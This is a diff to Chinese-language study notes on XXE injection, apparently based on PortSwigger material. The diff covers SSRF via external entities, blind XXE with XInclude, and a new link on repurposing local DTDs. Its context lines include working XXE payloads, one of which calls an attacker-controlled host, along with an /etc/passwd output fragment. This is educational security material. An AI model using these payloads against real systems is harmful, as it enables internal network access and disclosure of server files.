@@ -128,7 +128,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 # 利用XXE进行SSRF攻击
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 要利用 XXE 漏洞执行 SSRF 攻击，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用定义的实体。如果您可以在应用程序响应中返回的数据值中使用定义的实体，那么您将能够在应用程序的响应中查看来自 URL 的响应，从而获得与后端系统的双向交互。否则，您将只能执行盲目的 SSRF 攻击（这仍然可能产生严重后果）。比如说，xxe打ssrf获取云服务器的元数据
-# 盲xxe
+# 盲xxe(包括xinclude)
 在许多情况下，XXE 注入漏洞的攻击面是显而易见的，因为应用程序的正常 HTTP 流量包括包含 XML 格式数据的请求。在其他情况下，攻击面不太明显。但是，如果您查看正确的地方，您会在不包含任何 XML 的请求中发现 XXE 攻击面。
 某些应用程序接收客户端提交的数据，将其嵌入服务器端的 XML 文档中，然后解析文档。例如，将客户端提交的数据放入后端 SOAP 请求中，然后由后端 SOAP 服务处理该请求。
 在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改 DOCTYPE 元素。但是，您或许可以改用 XInclude。XInclude 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档的任何数据值内放置 XInclude 攻击，因此，在您只控制放置在服务器端 XML 文档中的单个数据项的情况下，可以执行该攻击。
@@ -221,6 +221,9 @@ Content-Length: 52
 
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 此 XXE 负载声明一个名为 xxe 的 XML 参数实体，然后在 DTD 中使用该实体。这将导致对攻击者的域进行 DNS 查找和 HTTP 请求，以验证攻击是否成功。
+# 通过重新利用本地 DTD 来利用盲 XXE
+具体看
+https://portswigger.net/web-security/xxe/blind
 
 # xxe防御
 
